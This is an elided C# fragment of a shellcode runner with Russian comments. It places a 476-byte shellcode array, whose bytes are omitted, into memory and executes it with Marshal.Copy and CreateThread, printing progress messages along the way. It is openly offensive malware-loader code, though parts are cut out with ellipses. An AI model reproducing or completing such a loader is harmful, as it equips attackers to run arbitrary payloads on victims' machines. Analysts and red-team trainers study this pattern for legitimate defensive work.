...
namespace ShellcodeRunner
{
    public class Program
    {
        ...
        {
            // ЗДЕСЬ НУЖНО ВСТАВИТЬ СГЕНЕРИРОВАННЫЙ ШЕЛЛКОД
            // Пример:
            byte[] shellcode = new byte[476] {
            ...
            Console.WriteLine("[*] Выделение памяти для шеллкода...");
            ...
            Console.WriteLine("[*] Копирование шеллкода в выделенную память...");
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            Console.WriteLine("[*] Создание потока для выполнения шеллкода...");
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] Ошибка при создании потока");
                return;
            }
            
            Console.WriteLine("[*] Ждем завершения потока...");
